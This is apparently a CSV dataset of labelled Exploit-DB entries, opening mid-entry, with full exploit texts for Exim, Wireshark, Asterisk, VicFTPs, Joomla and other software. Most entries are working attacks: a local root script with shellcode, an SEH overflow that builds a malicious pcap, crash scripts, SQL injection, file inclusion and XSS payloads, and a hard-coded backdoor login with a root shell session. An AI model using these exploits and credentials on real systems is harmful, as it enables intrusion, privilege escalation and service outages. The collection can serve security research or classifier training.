craftedsh1t.mid"");     exit(1); }      // milw0rm.com [2006-06-20]",Winamp,1
26458,"News2Net 3.0 - 'index.php' SQL Injection source: https://www.securityfocus.com/bid/15274/info  News2Net is prone to an SQL injection vulnerability. This issue is due to a failure in the application to properly sanitize user-supplied input before using it in an SQL query.  Successful exploitation could result in a compromise of the application, disclosure or modification of data, or may permit an attacker to exploit vulnerabilities in the underlying database implementation.   http://www.example.com/news2net/index.php?category=[SQL]",News2Net,1
44183,"Asterisk chan_pjsip 15.2.0 - 'SDP fmtp' Denial of Service ''' # Segmentation fault occurs in asterisk with an invalid SDP fmtp attribute  - Authors:     - Alfred Farrugia <alfred@enablesecurity.com>     - Sandro Gauci <sandro@enablesecurity.com> - Latest vulnerable version: Asterisk 15.2.0 running `chan_pjsip` - References: AST-2018-003 - Enable Security Advisory: <https://github.com/EnableSecurity/advisories/tree/master/ES2018-02-asterisk-pjsip-sdp-invalid-fmtp-segfault/> - Vendor Advisory: <http://downloads.asterisk.org/pub/security/AST-2018-003.html> - Timeline:     - Issue reported to vendor: 2018-01-15     - Vendor patch made available to us: 2018-02-05     - Vendor advisory published: 2018-02-21     - Enable Security advisory: 2018-02-22   ## Description  A specially crafted SDP message body with an invalid fmtp attribute causes a segmentation fault in asterisk using `chan_pjsip`.   ## Impact  Abuse of this vulnerability leads to denial of service in Asterisk when `chan_pjsip` is in use.   ## How to reproduce the issue  The following SIP message was used to reproduce the issue:  ``` INVITE sip:5678@127.0.0.1:5060 SIP/2.0 To: <sip:5678@127.0.0.1:5060> From: Test <sip:5678@127.0.0.1:5060> Call-ID: adc9caea-2d0a-40af-9de5-1dd21387e03a CSeq: 2 INVITE Via: SIP/2.0/UDP 172.17.0.1:10394;branch=z9hG4bKadc9caea-2d0a-40af-9de5-1dd21387e03a Contact: <sip:5678@172.17.0.1> Content-Type: application/sdp Content-Length: 228  v=0 o=- 1061502179 1061502179 IN IP4 172.17.0.1 s=Asterisk c=IN IP4 172.17.0.1 t=0 0 m=audio 17000 RTP/AVP 9 0 101 a=rtpmap:8 alaw/8000 a=rtpmap:0 PCMU/8000 a=rtpmap:101 telephone-event/8000 a=fmtp\x00:101 0-16 a=sendrecv ```  Notes:   - `\x00` should be replaced by the null character - authentication may be required  - the destination SIP address should match a valid extension in the dialplan.  To facilitate this process we wrote the following python program to reproduce this issue: '''  python import socket import re import md5 import uuid  SERVER_IP = ""127.0.0.1"" SERVER_PORT = 5060 UDP_IP = ""0.0.0.0"" UDP_PORT = 13940 USERNAME = ""5678"" PASSWORD = ""5678"" INVITE_USERNAME = ""5678""  sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) sock.bind((UDP_IP, UDP_PORT))  callid = str(uuid.uuid4())  sdpbody = ""v=0\r\no=- 1061502179 1061502179 IN IP4 172.17.0.1\r\n"" \     ""s=Asterisk\r\n"" \     ""c=IN IP4 172.17.0.1\r\n"" \     ""t=0 0\r\n"" \     ""m=audio 17000 RTP/AVP 9 0 101\r\n"" \     ""a=rtpmap:8 alaw/8000\r\n"" \     ""a=rtpmap:0 PCMU/8000\r\n"" \     ""a=rtpmap:101 telephone-event/8000\r\n"" \     ""a=fmtp\x00:101 0-16\r\n""\     ""a=sendrecv""  msg=""INVITE sip:%s@%s:%i SIP/2.0\r\n"" \     ""To: <sip:%s@%s:%i>\r\n"" \     ""From: Test <sip:%s@%s:%s>\r\n"" \     ""Call-ID: %s\r\n"" \     ""CSeq: 2 INVITE\r\n"" \     ""Via: SIP/2.0/UDP 172.17.0.1:10394;branch=z9hG4bK%s\r\n"" \     ""Contact: <sip:%s@172.17.0.1>\r\n"" \     ""Content-Type: application/sdp\r\n"" \     ""{{AUTH}}"" \     ""Content-Length: %i\r\n"" \     ""\r\n"" % (         INVITE_USERNAME, SERVER_IP, SERVER_PORT,         INVITE_USERNAME, SERVER_IP, SERVER_PORT,         USERNAME, SERVER_IP, SERVER_PORT,         callid, callid,         USERNAME, len(sdpbody)         ) + \     sdpbody  sock.sendto(msg.replace(""{{AUTH}}"", """"), (SERVER_IP, SERVER_PORT))  data, addr = sock.recvfrom(10240)  if data.startswith(""SIP/2.0 401""):     for line in data.split('\r\n'):         if line.startswith(""WWW-Authenticate""):             content = line.split(':', 2)[1].strip()             realm = re.search(""realm=\""([a-z]+)\"""", content).group(1)             nonce = re.search(""nonce=\""([a-z0-9\/]+)\"""", content).group(1)             ha1 = md5.new(USERNAME + "":"" + realm + "":"" + PASSWORD).hexdigest()             uri = ""sip:%s:%i"" % (SERVER_IP, SERVER_PORT)             ha2 = md5.new(""INVITE:"" + uri).hexdigest()             r = md5.new(ha1 + "":"" + nonce + "":"" + ha2).hexdigest()              auth = ""Authorization: Digest username=\""%s\"","" % (USERNAME) + \                 ""realm=\""%s\"","" % (realm) + \                 ""nonce=\""%s\"","" % (nonce) + \                 ""uri=\""%s\"","" % (uri) + \                 ""response=\""%s\"","" % (r) + \                 ""algorithm=md5\r\n""  sock.sendto(msg.replace(""{{AUTH}}"", auth), (SERVER_IP, SERVER_PORT))  ''' This security issue was discovered through the use of simple fuzzing with [Radamsa](https://github.com/aoh/radamsa) and our internal toolset.  ### GDB backtrace result  ``` Thread 197 ""asterisk"" received signal SIGSEGV, Segmentation fault. [Switching to Thread 0x7fff65e57700 (LWP 10595)] pjmedia_sdp_attr_get_fmtp (attr=<optimized out>, fmtp=fmtp@entry=0x7fff65e56430) at ../src/pjmedia/sdp.c:350 350	    while (pj_isdigit(*p) && p!=end) (gdb) bt #0  pjmedia_sdp_attr_get_fmtp (attr=<optimized out>, fmtp=fmtp@entry=0x7fff65e56430) at ../src/pjmedia/sdp.c:350 #1  0x00007fff6bf49070 in get_codecs (session_media=0x7fff74799540, codecs=0x7fff65e56450, stream=0x7fff97f99de0, session=0x7fff74581688) at res_pjsip_sdp_rtp.c:276 #2  set_caps (session=session@entry=0x7fff74581688, session_media=session_media@entry=0x7fff74799540, session_media_transport=0x7fff74799540, stream=stream@entry=0x7fff97f99de0, is_offer=is_offer@entry=1, asterisk_stream=asterisk_stream@entry=0x7fff747a03b0)     at res_pjsip_sdp_rtp.c:352 #3  0x00007fff6bf4b2d7 in negotiate_incoming_sdp_stream (session=0x7fff74581688, session_media=0x7fff74799540, sdp=<optimized out>, index=<optimized out>, asterisk_stream=0x7fff747a03b0) at res_pjsip_sdp_rtp.c:1185 #4  0x00007ffff1a16bb9 in handle_incoming_sdp (session=session@entry=0x7fff74581688, sdp=0x7fff97f99870) at res_pjsip_session.c:671 #5  0x00007ffff1a1a721 in new_invite (invite=<synthetic pointer>) at res_pjsip_session.c:2871 #6  handle_new_invite_request (rdata=0x7fff573f88d8) at res_pjsip_session.c:2966 #7  session_on_rx_request (rdata=0x7fff573f88d8) at res_pjsip_session.c:3030 #8  0x00007ffff7868df7 in pjsip_endpt_process_rx_data (endpt=<optimized out>, rdata=rdata@entry=0x7fff573f88d8, p=p@entry=0x7ffff1a0ace0 <param>, p_handled=p_handled@entry=0x7fff65e56d44) at ../src/pjsip/sip_endpoint.c:887 #9  0x00007ffff17e009f in distribute (data=0x7fff573f88d8) at res_pjsip/pjsip_distributor.c:903 #10 0x00000000005fb3be in ast_taskprocessor_execute (tps=tps@entry=0x1dc33a8) at taskprocessor.c:963 #11 0x0000000000602610 in execute_tasks (data=0x1dc33a8) at threadpool.c:1322 #12 0x00000000005fb3be in ast_taskprocessor_execute (tps=0x1a39488) at taskprocessor.c:963 #13 0x0000000000602af0 in threadpool_execute (pool=0x1a37ca8) at threadpool.c:351 #14 worker_active (worker=0x7fff9457ccd8) at threadpool.c:1105 #15 worker_start (arg=arg@entry=0x7fff9457ccd8) at threadpool.c:1024 #16 0x000000000060d4bd in dummy_start (data=<optimized out>) at utils.c:1257 #17 0x00007ffff5e3d6ba in start_thread (arg=0x7fff65e57700) at pthread_create.c:333 #18 0x00007ffff54263dd in clone () at ../sysdeps/unix/sysv/linux/x86_64/clone.S:109 (gdb)  ```   ## Solutions and recommendations  Apply the patch issued by Asterisk at <http://www.asterisk.org/security> or upgrade to the latest release.  ## About Enable Security  [Enable Security](https://www.enablesecurity.com) provides Information Security services, including Penetration Testing, Research and Development, to help protect client networks and applications against online attackers.  ## Disclaimer  The information in the advisory is believed to be accurate at the time of publishing based on currently available information. Use of the information constitutes acceptance for use in an AS IS condition. There are no warranties with regard to this information. Neither the author nor the publisher accepts any liability for any direct, indirect, or consequential loss or damage arising from use of, or reliance on, this information. '''",Asterisk chan_pjsip,1
796,"Exim 4.42 - Local Privilege Escalation #!/bin/sh  # Local Lame R00T sploit for exim <= 4.42 # by Dark Eagle #   # My First Coding Release In bash ))  # Unl0ck Research Team #  # More Effective than C-code. # # @env.c content: # ################################################### #  #include <stdio.h> #  #include <string.h> #  int main(int argc, char *argv[]) #  { #  char *addr_ptr; #  addr_ptr = getenv(argv[1]); #  printf(""%s @ %p\n"", argv[1], addr_ptr); #  return 0; #  } ###################################################  gcc @env.c -o @env  cp @env /usr/bin cd /usr/exim/bin  CODE=`perl -e 'print ""\x31\xc0\x31\xdb\xb0\x17\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69 \x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80""'`;export CODE  @env CODE echo ""So, dude, starting..."" echo ""NoW Just Type Address Of CODE""  read ADDRESS  echo ""You are typed: $ADDRESS""  echo ""Leeeeeeeeeeeeet'sssssssssss g000000000000000!!!!!!!!!""  ./exim -bh ::%A`perl -e 'print pack('L','$ADDRESS') x 256'`  # milw0rm.com [2005-02-07]",Exim,1
17185,"Wireshark 1.4.1 < 1.4.4 - Local Overflow (SEH) #!/usr/bin/env python # Vulnerable app: Wireshark 1.4.1-1.4.4 # Author: sickness # Download :  # OS: Tested it on Windows XP SP2 and SP3 but it should work on every Windows with DEP off (still working on a ROP exploit) # DATE   : 17.04.2011 # Fixed in latest version 1.4.5 # DO NOT FORGET TO FEEL THE PWNSAUCE WITH: http://redmine.corelan.be:8800/projects/pvefindaddr ################################################################### # Offset might change! # Watch out for other bad chars!! # Current bad chars: \x00\x0a\x0d\x09 ################################################################### # References: # https://bugs.wireshark.org/bugzilla/show_bug.cgi?id=5836 # https://bugs.wireshark.org/bugzilla/show_bug.cgi?id=5838 ###################################################################   import sys from scapy.all import *  #payload=calc.exe #ppr is from a non-ASLR enabled wireshark module  evil = Ether(type=0x2323)/(""\x41"" * 1239 + ""\xeb\x06\x90\x90"" +  ""\x5D\x10\x94\x62"" + ""\x90"" * 16 + ""\x33\xc9\x83\xe9\xce\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76\x0e\x17\x22\xfd\x6a\x83\xee\xfc\xe2\xf4\xeb\xca\x74\x6a\x17\x22\x9d\xe3\xf2\x13\x2f\x0e\x9c\x70\xcd\xe1\x45\x2e\x76\x38\x03\xa9\x8f\x42\x18\x95\xb7\x4c\x26\xdd\xcc\xaa\xbb\x1e\x9c\x16\x15\x0e\xdd\xab\xd8\x2f\xfc\xad\xf5\xd2\xaf\x3d\x9c\x70\xed\xe1\x55\x1e\xfc\xba\x9c\x62\x85\xef\xd7\x56\xb7\x6b\xc7\x72\x76\x22\x0f\xa9\xa5\x4a\x16\xf1\x1e\x56\x5e\xa9\xc9\xe1\x16\xf4\xcc\x95\x26\xe2\x51\xab\xd8\x2f\xfc\xad\x2f\xc2\x88\x9e\x14\x5f\x05\x51\x6a\x06\x88\x88\x4f\xa9\xa5\x4e\x16\xf1\x9b\xe1\x1b\x69\x76\x32\x0b\x23\x2e\xe1\x13\xa9\xfc\xba\x9e\x66\xd9\x4e\x4c\x79\x9c\x33\x4d\x73\x02\x8a\x4f\x7d\xa7\xe1\x05\xc9\x7b\x37\x7d\x23\x70\xef\xae\x22\xfd\x6a\x47\x4a\xcc\xe1\x78\xa5\x02\xbf\xac\xd2\x48\xc8\x41\x4a\x5b\xff\xaa\xbf\x02\xbf\x2b\x24\x81\x60\x97\xd9\x1d\x1f\x12\x99\xba\x79\x65\x4d\x97\x6a\x44\xdd\x28\x09\x76\x4e\x9e\x44\x72\x5a\x98\x6a"" + ""\x90"" * 4500) wrpcap(""evil.pcap"",evil)   print ""\n"" print ""Evil .pcap file created!"" print ""It's pwnsauce time!\n""",Wireshark,1
40431,"NetMan 204 - Backdoor Account NetMan 204 - Backdoor Account  Author: Saeed reza Zamanian [penetrationtest @ Linkedin]    Product: NetMan 204 Vendor: http://www.riello-ups.com Product URL: http://www.riello-ups.com/products/4-software-connectivity/85-netman-204 Quick Reference Installation Manual : http://www.riello-ups.com/uploads/file/325/1325/0MNACCSA4ENQB__MAN_ACC_NETMAN_204_QST_EN_.pdf   Date: 23 Sep 2016  About Product: ---------------------- The NetMan 204 network agent allows UPS directly connected over LAN 10/100 Mb connections to be managed using the main network communication protocols (TCP /IP , HTTP HTTPS, SSH, SNMPv1, SNMPv2 and SNMPv3). It is the ideal solution for the integration of UPS over Ethernet networks with Modbus/TCP and BACnet/IP protocols. It was developed to integrate UPS into medium-sized and large networks, to provide a high level of reliability in communication between the UPS and associated management systems.  Vulnerability Report: ---------------------- The UPS Module has 3 default accounts, (admin,fwupgrade,user) , fwupgrade has a shell access to the device BUT if you try to get access to the shell a shell script closes your conection. to stop the shell script and avoid to terminate your connection you should , set your SSH client to execute ""/bin/bash"" after you logon the SSH. as a result your shell type will be changed to ""/bin/bash"" as you see below there is an account called ""eurek"" and ofcourse it's password also is ""eurek"". Since that ""eurek"" is a sudoer user you will get full access to the device.  Enjoy It!   login as: eurek eurek@172.19.16.33's password: Could not chdir to home directory /home/eurek: No such file or directory eurek@UPS:/$ id uid=1000(eurek) gid=1000(eurek) groups=1000(eurek),27(sudo) eurek@UPS:/$ sudo bash [sudo] password for eurek: root@UPS:/# id uid=0(root) gid=0(root) groups=0(root) root@UPS:/#    login as: fwupgrade fwupgrade@172.19.16.33's password: fwupgrade@UPS:/home/fwupgrade$ cat /etc/passwd root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/bin/sh bin:x:2:2:bin:/bin:/bin/sh sys:x:3:3:sys:/dev:/bin/sh sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/bin/sh man:x:6:12:man:/var/cache/man:/bin/sh lp:x:7:7:lp:/var/spool/lpd:/bin/sh mail:x:8:8:mail:/var/mail:/bin/sh news:x:9:9:news:/var/spool/news:/bin/sh uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh proxy:x:13:13:proxy:/bin:/bin/sh www-data:x:33:33:www-data:/var/www:/bin/sh backup:x:34:34:backup:/var/backups:/bin/sh list:x:38:38:Mailing List Manager:/var/list:/bin/sh irc:x:39:39:ircd:/var/run/ircd:/bin/sh gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh nobody:x:65534:65534:nobody:/nonexistent:/bin/sh libuuid:x:100:101::/var/lib/libuuid:/bin/sh sshd:x:101:65534::/var/run/sshd:/usr/sbin/nologin messagebus:x:102:104::/var/run/dbus:/bin/false eurek:x:1000:1000:eurek,,,:/home/eurek:/bin/bash postfix:x:103:106::/var/spool/postfix:/bin/false statd:x:104:65534::/var/lib/nfs:/bin/false pulse:x:105:110:PulseAudio daemon,,,:/var/run/pulse:/bin/false rtkit:x:106:112:RealtimeKit,,,:/proc:/bin/false admin:x:1001:1001:,,,:/home/./admin:/bin/bash fwupgrade:x:1002:1002:,,,:/home/./fwupgrade:/bin/bash user:x:1003:1003:,,,:/home/user:/bin/bash ftp:x:107:113:ftp daemon,,,:/srv/ftp:/bin/false fwupgrade@UPS:/home/fwupgrade$    # EOF",NetMan,1
13826,"Site for Real Estate - Brokers SQL Injection Vendor url:http://www.mformula.com.br/ Greetz to:Sid3^effects, MaYur, M4n0j, Dark Blue, S1ayer,d3c0d3r,KD and to all ICW & AH members. Spl Greetz to:inj3ct0r.com Team  #####################################################################################################################################################################################################  Description:  * Site for Real Estate - Brokers SQL Injection Vulnerability *  Resources and Advantages Better cost-benefit of the market Internal system for total administration of the site Available site in the languages Portuguese, Español, English and Japanese Property Management Management Clients Support for Sale and Rent Unlimited Publication of Photos for Property RSS/XML feed Optimization in search engines SiteMap Google, Yahoo and Bing Supported to any type of personalized option (Color, Size, Type, etc) Personalization of the layout, colors and texts of the site in agreement your mark Reports detailed on the site Support via HelpDesk integrated in the Administration of your site #######################################################################################################################################################################################################  Vulnerability:  *SQLi Vulnerability  DEMO URL :  http://server/products.php?imovelfor_id=[sqli]  http://server/products_view.php?id=[sqli]  # 0day n0 m0re #  --  With R3gards, L0rd CrusAd3r",Site for Real Estate,1
39727,"CompuSource Systems Real Time Home Banking - Local Privilege Escalation # Exploit Title: CompuSource Systems - Real Time Home Banking - Local Privilege Escalation/Arbitrary Code Execution # Date: 2/25/16 # Exploit Author: singularitysec@gmail.com # Vendor Homepage: https://www.css4cu.com #                                   : https://www.css4cu.com/Next/InfoSide/SoftwareSolutions.php # Version: CompuSource Systems - Real Time Home Banking # Tested on: Windows 7 # CVE : TBD  Note: Windows Server 2003/2008/2012  *may* be vulnerable, depending on system configuration.  This vulnerability has been reference checked against multiple installs. This configuration was identical across all systems tested.  Executables/Services:  %SystemRoot%/css50/csdir/RealTimeHomeBankingSvc.exe HomeBankingService  Attack Detail: The application installs with LOCAL SYSTEM service credentials in the directory %SystemRoot%/css50/csdir   The executables that are installed, by default, allow AUTHENTICATED USERS to modify, replace or alter the file. This would allow an attacker to inject their code or replace the executable and have it run in the context of the system.   This would allow complete compromise of a machine on which it was installed, giving the process LOCAL SYSTEM access to the machine in question. An attacker can replace the file or append code to the executable, reboot the system or restart the service and it would then compromise the machine. As LOCAL SYSTEM is the highest privilege level on a machine, this allows total control and access to all parts of the system.   Remediation:  Remove the modify/write permissions on the executables to allow only privileged users to alter the files. Apply vendor patch when distributed.  Vulnerability Discovered: 2/25/16  Vendor Notified: 2/25/16   Website: www.information-paradox.net This vulnerability was discovered by singularitysec@gmail.com. Please credit the author in all references to this exploit.",CompuSource Systems Real Time Home Banking,1
32572,"Anti-Trojan Elite 4.2.1 - 'Atepmon.sys' IOCTL Request Local Overflow / Local Privilege Escalation source: https://www.securityfocus.com/bid/32202/info  ISecSoft Anti-Trojan Elite and Anti-Keylogger Elite are prone to multiple local privilege-escalation vulnerabilities.  An attacker can exploit these issues to execute arbitrary code with elevated privileges, which may facilitate a complete compromise of the affected computer.  The following applications are vulnerable:  Anti-Trojan Elite 4.2.1 and earlier Anti-Keylogger Elite 3.3.0 and earlier  https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/32572-1.zip (AKEProtect_Exp.zip) https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/32572-2.zip (Atepmon_DoS.zip)",Anti-Keylogger Elite,1
20638,"Bajie WebServer 0.78/0.90 - Remote Command Execution source: https://www.securityfocus.com/bid/2388/info  It is possible to execute arbitrary commands on a host running Bajie Webserver.  A remote user can use Bajie's built-in upload feature to place malicious scripts on Bajie webservers. These uploaded scripts are placed in known destination directories and can be automatically executed. Unfortunately Bajie's CGI processor doesn't verify the CGI program exists before executing the script.  Once these files are uploaded, they can be then executed as CGI scripts on the server.   Upload the malicious script via:  http://target/upload.html  Execute it via:  http://target/cgi/bin//...//upload/[file name]",Bajie webservers,1
5423,"Ksemail - Local File Inclusion   :::::::-.   ...    ::::::.    :::.    ;;,   `';, ;;     ;;;`;;;;,  `;;;    `[[     [[[['     [[[  [[[[[. '[[     $$,    $$$$      $$$  $$$ ""Y$c$$     888_,o8P'88    .d888  888    Y88     MMMMP""`   ""YmmMMMM""""  MMM     YM     [ Discoverd by dun \ dun[at]strcpy.eu ]   #####################################################  #  [  Ksemail  ]  Local File Include Vulnerability  #  #####################################################  #  # Script site:  http://www.ksemail.com/, http://mail.ksemail.com  #   # Vuln:   # http://site.com/prog/index.php?language=../../../../../../etc/passwd   # http://site.com/prog/index.php?lang=../../../../../../etc/passwd  #	  # Dork example: ""FoxMail/Outook""  #  ###############################################  # Greetz: D3m0n_DE, nejman, sid_psycho  # and all otherz.. [;  ###############################################   [ dun / 2008 ]   ********************************************************************************************  # milw0rm.com [2008-04-10]",Ksemail,1
45464,Joomla! Component Raffle Factory 3.5.2 - SQL Injection # # # # # # Exploit Title: Joomla! Component Raffle Factory 3.5.2 - SQL Injection # Dork: N/A # Date: 2018-09-24 # Vendor Homepage: https://thephpfactory.com/ # Software Link: https://extensions.joomla.org/extensions/extension/e-commerce/auction/raffle-factory/ # Version: 3.5.2 # Category: Webapps # Tested on: WiN7_x64/KaLiLinuX_x64 # CVE: CVE-2018-17379 # # # # # # Exploit Author: Ihsan Sencan # # # # # # POC:  #  # 1) # http://localhost/[PATH]/index.php?task=showSearchResults&option=com_rafflefactory&filter_order_Dir=[SQL]&filter_order=[SQL] #  # %2c%45%58%54%52%41%43%54%56%41%4c%55%45%28%36%36%2c%43%4f%4e%43%41%54%28%30%78%35%63%2c%28%53%45%4c%45%43%54%20%28%45%4c%54%28%36%36%3d%36%36%2c%31%29%29%29%2c%43%4f%4e%43%41%54%5f%57%53%28%30%78%32%30%33%61%32%30%2c%55%53%45%52%28%29%2c%44%41%54%41%42%41%53%45%28%29%2c%56%45%52%53%49%4f%4e%28%29%29%29%29 #   # # # #,Joomla! Component Raffle Factory,1
39721,"C/C++ Offline Compiler and C For OS - Persistent Cross-Site Scripting Document Title: =============== C & C++ for OS - Filter Bypass & Persistent Vulnerability   References (Source): ==================== http://www.vulnerability-lab.com/get_content.php?id=1825   Release Date: ============= 2016-04-14   Vulnerability Laboratory ID (VL-ID): ==================================== 1825   Common Vulnerability Scoring System: ==================================== 3.5   Product & Service Introduction: =============================== This is an ios c app,you can learn,run,share c code. The software is a offline compiler for developers with apple iOS. Code templates,the contents of the new file is copy from contents of the template file.  (Copy of the Homepage: https://itunes.apple.com/us/app/c-for-os-programming-language/id1016290003 )   This is an ios c/c++ app,you can learn,run,share c/c++ code. In(the built-in browser or the txt editor),Select the text to run. Code templates,the contents of the new file is copy from contents of the template file.   (Copy of the Homepage: https://itunes.apple.com/us/app/c-c++-offline-compiler-for/id1016322367 )   Abstract Advisory Information: ============================== The vulnerability laboratory core research team discovered an application-side validation vulnerability in the official C & C++ for OS web-application (api).   Vulnerability Disclosure Timeline: ================================== 2016-04-14: Public Disclosure (Vulnerability Laboratory)   Discovery Status: ================= Published   Affected Product(s): ==================== XiaoWen Huang Product: C for OS & C++ - Mobile API (Web-Application) 1.2   Exploitation Technique: ======================= Remote   Severity Level: =============== Medium   Technical Details & Description: ================================ A persistent input validation and mail encode web vulnerability has been discovered  in the official C & C++ for OS web-application (api). The persistent web vulnerability allows an attacker to inject malicious script codes on the application-side of the vulnerable modules context.  The basic validation of the code formular and mask allows to include any type of script codes or programming language without offensive input  restrictions. Attackers can inject code to a project to share it with another source. In the moment the code of the project is generated to as  email body, a persistent script code execution occurs.  There are two options to exploit, first is to send the malicious mail to the author of the program by the `Mail Author` function. Another possibility  to execute code in the email body context is to share it with another code editor by email. In both email body message context the injected wrong  filtered script code execution occurs. The internal encoding of the formular is correctly done but in case of sharing by qr or via message body email  the execution occurs. The vulnerability is located on the application-side of the iOS application and the request method to inject requires physical  device access or access to the share function. The bug is present in the C & C++ for OS 1.2 version of the mobile client. Attackers can for example  generate a QR code with malicious context that is executed in the message body were the code is mainly displayed by the iOS application.  The security risk of the application-side vulnerability is estimated as medium with a cvss (common vulnerability scoring system) count of 3.5.  Exploitation of the persistent vulnerability requires a low privileged ios device user account with restricted access and low user interaction.  Successful exploitation of the vulnerabilities results in persistent phishing mails, session hijacking, persistent external redirect to malicious  sources and application-side manipulation of affected or connected module context.  Vulnerable Module(s): 				[+] Share to Authors 				[+] Share by Email 				[+] Share via QR Code  Vulnerable Function(s): 				[+] Console 				[+] C  or C++   Proof of Concept (PoC): ======================= The persistent vulnerability and mail encoding bug can be exploited by remote attackers with low privileged device user account and low user interaction. For security demonstration or to reproduce the vulnerability follow the provided information and steps below to continue.  Manual steps to reproduce the vulnerability ... 1. Install the perl app to your apple iOS device 2. Start the mobile application 3. Include to the first variable in the demo code java or html script code and save the entry as c or c++ script 4. Open the saved entry again and click the top right arrow menu 5. Now choose Create QR or Share menu button 6. Open the menu `Mail to Author` or push the default `iOS Mail App` button 7. Now the code of the formular gets transfered to the email message body context Note: The encoding does not parse or encode any inserted values 8. The email arrives to the target inbox 9. Open the email and the code executes directly in the message body or next to the generated qr code 10. Successful reproduce of the filter and validation vulnerability in the c and c++ app api!  Note: The bug can be exploited by sending to the author, by sending to another target mail or by transfer of a qr code.   Solution - Fix & Patch: ======================= The vulnerability can be patched by a secure parse and encode of the vulnerable message body context. Filter and parse all code values that are included to the message body. Configure the code to plain text not html to prevent  further persistent injection attacks. In case of emergency use the escape function to separate the mechanism permanently.   Security Risk: ============== The security risk of the application-side mail encode web vulnerability in the mobile application api is estimated as medium. (CVSS 3.5)   Credits & Authors: ================== Vulnerability Laboratory [Research Team] - Benjamin Kunz Mejri (bkm@evolution-sec.com) [www.vulnerability-lab.com]   Disclaimer & Information: ========================= The information provided in this advisory is provided as it is without any warranty. Vulnerability Lab disclaims all warranties, either expressed or implied,  including the warranties of merchantability and capability for a particular purpose. Vulnerability-Lab or its suppliers are not liable in any case of damage,  including direct, indirect, incidental, consequential loss of business profits or special damages, even if Vulnerability-Lab or its suppliers have been advised  of the possibility of such damages. Some states do not allow the exclusion or limitation of liability for consequential or incidental damages so the foregoing  limitation may not apply. We do not approve or encourage anybody to break any licenses, policies, deface websites, hack into databases or trade with stolen data.  Domains:    www.vulnerability-lab.com 		- www.vuln-lab.com 						- www.evolution-sec.com Contact:    admin@vulnerability-lab.com 	- research@vulnerability-lab.com 				- admin@evolution-sec.com Section:    magazine.vulnerability-lab.com 	- vulnerability-lab.com/contact.php 				- evolution-sec.com/contact Social:	    twitter.com/vuln_lab		- facebook.com/VulnerabilityLab 				- youtube.com/user/vulnerability0lab Feeds:	    vulnerability-lab.com/rss/rss.php 	- vulnerability-lab.com/rss/rss_upcoming.php 			- vulnerability-lab.com/rss/rss_news.php Programs:   vulnerability-lab.com/submit.php 	- vulnerability-lab.com/list-of-bug-bounty-programs.php 	- vulnerability-lab.com/register.php  Any modified copy or reproduction, including partially usages, of this file requires authorization from Vulnerability Laboratory. Permission to electronically  redistribute this alert in its unmodified form is granted. All other rights, including the use of other media, are reserved by Vulnerability-Lab Research Team or  its suppliers. All pictures, texts, advisories, source code, videos and other information on this website is trademark of vulnerability-lab team & the specific  authors or managers. To record, list, modify, use or edit our material contact (admin@ or research@vulnerability-lab.com) to get a ask permission.  				    Copyright © 2016 | Vulnerability Laboratory - [Evolution Security GmbH]™    --  VULNERABILITY LABORATORY - RESEARCH TEAM SERVICE: www.vulnerability-lab.com CONTACT: research@vulnerability-lab.com",C/C++ Offline Compiler,1
3331,"VicFTPS < 5.0 - 'CWD' Remote Buffer Overflow (PoC) /* VicFTPs Server CWD Remote Buffer Overflow Vulnerability                  DoS Proof of concept              r0ut3r (writ3r [at] gmail.com)  Thanks to: Marsu (Marsupilamipowa [at] hotmail.fr) for helping me out with this vulnerability.  Greets Marsu, and Timq.  Description: Sending a long argument to CWD will cause VicFTPs Server to overwrite memory. EIP is overwritten at 323. The POC uses a larger buffer to overwrite exception handler, preventing an error message.   */  #include <stdio.h> #include <string.h> #include <sys/types.h> #include <sys/socket.h> #include <netinet/in.h>  #define PORT 21  int s; struct sockaddr_in sock_addr;  char recvbuf[1024]; char pwn[450];  int main(int argc, char* argv[]) {       if (argc < 2) {         printf(""Usage: %s <ip>\n"", argv[0]);         return 1; }        if ((s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0) {         printf(""error with socket\n"");         return 1; }        sock_addr.sin_family = AF_INET;       sock_addr.sin_addr.s_addr = inet_addr(argv[1]);       sock_addr.sin_port = htons(PORT);        if (connect(s, (struct sockaddr *)&sock_addr, sizeof(struct sockaddr)) == -1) {         printf(""unable to connect\n"");         return 1; }        printf(""[+] Connected\n"");       memset(recvbuf, '\0', 1024);       recv(s, recvbuf, 1024, 0);        char userbuf[50];       printf(""[+] Sending user...\n"");       memset(userbuf, '\0', 50);       memcpy(userbuf, ""USER anonymous\r\n"", 18);       if (send(s, userbuf, strlen(userbuf), 0) == -1) {         printf(""unable to send data\n"");         return 1; }        memset(recvbuf, '\0', 1024);       recv(s, recvbuf, 1024, 0);        char passbuf[50];         printf(""[+] Sending pass...\n"");         memcpy(passbuf, ""PASS anonymous\r\n"", 18);         if (send(s, passbuf, strlen(passbuf), 0) == -1) {                 printf(""unable to send data\n"");                 return 1; }       recv(s, recvbuf, 1024, 0);        printf(""[+] Building payload. \n"");       memset(pwn, '\0', 450);       memcpy(pwn, ""CWD "", 4);       memset(pwn+4, 'A', 400);       memcpy(pwn+404, ""\r\n"", 2);        printf(""[+] Sending payload.\n"");       if (send(s, pwn, strlen(pwn), 0) == -1) {         printf(""unable to send data\n"");         return 1; }        printf(""[!] Boom! crashed?!\n"");        return 0; }  // milw0rm.com [2007-02-18]",VicFTPs Server,1
23773,IGeneric Free Shopping Cart 1.4 - Cross-Site Scripting source: https://www.securityfocus.com/bid/9773/info  It has been reported that iGeneric Free Shopping Cart is prone to a cross-site vulnerability. This issue is due to a failure of the application to properly sanitize user supplied URI parameters  Exploitation could allow for theft of cookie-based authentication credentials. Other attacks are also possible.  page.php?page_type=catalog_products&type_id[]=%3Cscript%3Ealert(document.domain);%3C/script%3E&SESSION_ID={SESSION_ID}&SESSION_ID=,IGeneric Free Shopping Cart,1
